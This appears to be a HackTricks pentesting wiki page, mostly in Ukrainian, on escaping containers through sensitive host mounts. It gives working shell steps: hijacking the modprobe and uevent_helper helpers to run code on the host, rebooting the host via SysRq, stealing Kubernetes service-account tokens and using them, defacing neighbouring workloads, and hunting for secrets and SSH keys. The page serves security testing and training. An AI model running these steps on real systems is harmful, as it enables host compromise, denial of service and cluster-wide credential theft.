# Чутливі Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Host mounts — одна з найважливіших практичних поверхонь для container-escape, оскільки вони часто руйнують ретельно ізольований вигляд процесів і повертають прямий доступ до ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind mounts `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state або шляхи, пов'язані з пристроями, можуть відкривати керування ядром, облікові дані, файлові системи сусідніх контейнерів і інтерфейси управління runtime.

Ця сторінка існує окремо від індивідуальних сторінок захисту, оскільки модель зловживання є поперечною. Записуваний host mount є небезпечним частково через mount namespaces, частково через user namespaces, частково через покриття AppArmor або SELinux і частково через те, який саме шлях хоста був виставлений. Розглядати це як окрему тему значно спрощує аналіз attack surface.

## `/proc` Експозиція

procfs містить як звичайну інформацію про процеси, так і інтерфейси керування ядром з високим впливом. Bind mount такий як `-v /proc:/host/proc` або view контейнера, який відкриває непередбачувані записувані записи в proc, може привести до розкриття інформації, denial of service або прямого виконання коду на хості.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Почніть з перевірки, які high-value procfs entries видимі або записувані:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

Практична цінність кожного шляху різна, і ставитись до всіх як до рівнозначних ускладнює triage:

- `/proc/sys/kernel/core_pattern`
Якщо записуваний, це один із найвпливовіших procfs-шляхів, оскільки ядро виконає pipe handler після падіння. Контейнер, який може вказати `core_pattern` на payload, збережений в його overlay або в змонтованому хост-шляху, часто може отримати виконання коду на хості. Див. також [read-only-paths.md](protections/read-only-paths.md) для прикладу.

- `/proc/sys/kernel/modprobe`
Цей шлях керує userspace helper, що використовується ядром для виклику логіки завантаження модулів. Якщо він записуваний з контейнера і інтерпретується в контексті хоста, це може стати ще одним примітивом для виконання коду на хості. Особливо цікавий у поєднанні зі способом тригернути helper path.

- `/proc/sys/vm/panic_on_oom`
Зазвичай не є чистим примітивом для escape, але може перетворити дефіцит пам'яті в DoS по всьому хосту, ввімкнувши поведінку kernel panic при OOM.

- `/proc/sys/fs/binfmt_misc`
Якщо інтерфейс реєстрації записуваний, атакуючий може зареєструвати handler для вибраного magic value і отримати виконання в контексті хоста при запуску підходящого файлу.

- `/proc/config.gz`
Корисний для kernel exploit triage. Дає змогу визначити, які підсистеми, mitigations і опціональні функції ядра увімкнені, без потреби в метаданих хост-пакетів.

- `/proc/sysrq-trigger`
Переважно шлях для denial-of-service, але дуже серйозний. Може негайно перезавантажити, викликати panic або іншим чином порушити роботу хоста.

- `/proc/kmsg`
Відкриває повідомлення кольцевого буфера ядра. Корисний для host fingerprinting, аналізу крашів і в деяких середовищах для leaking information, що допомагає kernel exploitation.

- `/proc/kallsyms`
Цінний, коли читається, оскільки розкриває інформацію про експортовані символи ядра та може допомогти зломити припущення про address randomization під час розробки kernel exploit.

- `/proc/[pid]/mem`
Це прямий інтерфейс до пам'яті процесу. Якщо цільовий процес доступний за необхідних ptrace-style умов, це може дозволити читати або змінювати пам'ять іншого процесу. Реалістичний вплив сильно залежить від облікових даних, `hidepid`, Yama і ptrace-обмежень, тож це потужний, але умовний шлях.

- `/proc/kcore`
Надає погляд на системну пам'ять у стилі core-image. Файл величезний і незручний у використанні, але якщо він значно читається, це вказує на погано виставлену поверхню пам'яті хоста.

- `/proc/kmem` and `/proc/mem`
Історично високоефективні інтерфейси сирової пам'яті. На багатьох сучасних системах вони вимкнені або сильно обмежені, але якщо присутні і доступні — слід вважати їх критичними знахідками.

- `/proc/sched_debug`
Leaks інформацію про scheduling і задачі, що може виявити ідентичності процесів хоста навіть коли інші перегляди процесів виглядають чистішими, ніж очікувалося.

- `/proc/[pid]/mountinfo`
Надзвичайно корисний для реконструкції того, де контейнер насправді розміщується на хості, які шляхи підтримуються overlay і чи відповідає записуване змонтоване тому, що на хості, або лише шару контейнера.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, оскільки низка трюків для виконання на хості вимагає перетворення шляху всередині контейнера на відповідний шлях з точки зору хоста.

### Повний приклад: `modprobe` Helper Path Abuse

Якщо `/proc/sys/kernel/modprobe` доступний для запису з контейнера і helper path інтерпретується в контексті хоста, його можна перенаправити на payload, керований атакуючим:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки ядра, але важливий момент у тому, що записуваний шлях до допоміжної програми може перенаправити майбутній виклик допоміжної функції ядра на вміст хоста під контролем атакуючого.

### Повний приклад: розвідка ядра з `kallsyms`, `kmsg` та `config.gz`

Якщо мета — оцінка можливості експлуатації, а не негайна втеча:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають з'ясувати, чи видима корисна інформація про символи, чи розкривають останні повідомлення kernel цікавий стан і які kernel features або mitigations зкомпільовано. Наслідок зазвичай не є прямим escape, але це може суттєво скоротити kernel-vulnerability triage.

### Повний приклад: перезавантаження хоста через SysRq

Якщо `/proc/sysrq-trigger` доступний для запису й видно з боку хоста:
```bash
echo b > /proc/sysrq-trigger
```
Ефект — миттєве перезавантаження хоста. Це не тонкий приклад, але він чітко демонструє, що доступ до procfs може бути набагато серйознішим, ніж просте розкриття інформації.

## `/sys` Exposure

sysfs відкриває доступ до великої кількості стану ядра та пристроїв. Деякі шляхи sysfs корисні здебільшого для fingerprinting, тоді як інші можуть впливати на запуск допоміжних утиліт, поведінку пристроїв, конфігурацію security-module або стан прошивки.

Важливі шляхи sysfs включають:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку системи керування температурою і, отже, на стабільність хоста в погано захищених середовищах. `/sys/kernel/vmcoreinfo` може leak інформацію про crash-dump та компоновку ядра, що допомагає з низькорівневим fingerprinting хоста. `/sys/kernel/security` — це інтерфейс `securityfs`, який використовується Linux Security Modules, тому непередбачений доступ туди може розкрити або змінити стан, пов'язаний з MAC. Шляхи змінних EFI можуть впливати на налаштування завантаження, збережені в прошивці, що робить їх набагато серйознішими за звичайні конфігураційні файли. `debugfs` під `/sys/kernel/debug` особливо небезпечний, оскільки це навмисно орієнтований на розробників інтерфейс з набагато меншими очікуваннями щодо безпеки, ніж зміцнені kernel APIs, призначені для production.

Корисні команди для перевірки цих шляхів такі:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Чому ці команди цікаві:

- `/sys/kernel/security` може виявити, чи AppArmor, SELinux або інша LSM-поверхня видима таким чином, що мала залишатися доступною лише на хості.
- `/sys/kernel/debug` часто є найтривожнішим виявленням у цій групі. Якщо `debugfs` змонтований і доступний для читання або запису, очікуйте широку поверхню, спрямовану на kernel, точний ризик якої залежить від включених debug nodes.
- Експозиція змінних EFI трапляється рідше, але якщо вона присутня, то має високий вплив, оскільки зачіпає налаштування, підтримувані прошивкою, а не звичайні файли часу виконання.
- `/sys/class/thermal` переважно стосується стабільності хоста та взаємодії з апаратним забезпеченням, а не для елегантного shell-style escape.
- `/sys/kernel/vmcoreinfo` здебільшого є джерелом для host-fingerprinting і crash-analysis, корисним для розуміння стану low-level kernel.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, kernel може виконати допоміжну програму під контролем атакуючого, коли викликається `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Причина, чому це працює, полягає в тому, що шлях helper інтерпретується з точки зору хоста. Після спрацьовування helper виконується в контексті хоста, а не всередині поточного контейнера.

## `/var` Доступ

Монтирование `/var` хоста в контейнер часто недооцінюють, бо це не виглядає так драматично, як монтування `/`. На практиці цього зазвичай достатньо, щоб отримати доступ до runtime-сокетів, директорій snapshot контейнерів, томів pod, що керуються kubelet, projected service-account tokens і файлових систем сусідніх додатків. На сучасних вузлах `/var` часто містить найбільш операційно цікаві стани контейнерів.

### Kubernetes Приклад

Под з `hostPath: /var` часто може читати проєктовані токени інших подів та вміст overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, бо відповідають на питання, чи монтування відкриває лише незначні дані додатку, чи високочутливі облікові дані кластера. Читабельний service-account token може миттєво перетворити local code execution на доступ до Kubernetes API.

Якщо token присутній, перевірте, до чого він може отримати доступ, замість того щоб зупинятися на token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Наслідки тут можуть бути значно більші, ніж доступ до локального вузла. token із широкими правами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.

### Приклад для Docker та containerd

На Docker-хостах відповідні дані часто розташовані в `/var/lib/docker`, тоді як на Kubernetes-нодах із containerd вони можуть знаходитися в `/var/lib/containerd` або в шляхах, специфічних для snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` відкриває для запису вміст знімка іншого workload, attacker може змінювати файли застосунку, розміщувати веб-контент або змінювати стартові скрипти без втручання в поточну конфігурацію container.

Конкретні ідеї зловживань після виявлення вмісту знімка, доступного для запису:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ці команди корисні, оскільки вони показують три основні сімейства впливу при монтуванні `/var`: application tampering, secret recovery і lateral movement into neighboring workloads.

## Runtime Sockets

Sensitive host mounts часто включають runtime sockets замість повних директорій. Вони настільки важливі, що заслуговують на явне повторення тут:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Дивіться [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) для повних сценаріїв експлуатації, коли один із цих сокетів змонтований.

Як швидкий початковий шаблон взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із них вдасться, шлях від "mounted socket" до "start a more privileged sibling container" зазвичай набагато коротший, ніж будь-який шлях ескейпу через kernel.

## Mount-Related CVEs

Монтування хоста також перетинається з уразливостями середовища виконання. Важливі нещодавні приклади включають:

- `CVE-2024-21626` в `runc`, де a leaked directory file descriptor міг помістити робочий каталог на файлову систему хоста.
- `CVE-2024-23651` та `CVE-2024-23653` в BuildKit, де OverlayFS copy-up races могли спричинити запис на host-path під час збірок.
- `CVE-2024-1753` в Buildah та Podman build flows, де спеціально сформовані bind mounts під час збірки могли відкрити `/` для читання-запису.
- `CVE-2024-40635` в containerd, де велике значення `User` могло переповнитися і призвести до поведінки, як у UID 0.

Ці CVE важливі тут, тому що показують, що обробка монтувань — це не тільки питання конфігурації оператора. Саме runtime також може вводити умови ескейпу, викликані монтуванням.

## Checks

Використайте ці команди, щоб швидко знайти найбільш критичні експозиції монтованих ресурсів:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Корінь хоста, `/proc`, `/sys`, `/var` та runtime sockets — усі є знахідками високого пріоритету.
- Записувані записи в `/proc` і `/sys` часто свідчать про те, що монтування відкриває доступ до загальнохостових керувань ядром, а не до безпечного контейнерного вигляду.
- Змонтовані шляхи в `/var` потребують перевірки облікових даних і сусідніх робочих навантажень, а не лише огляду файлової системи.
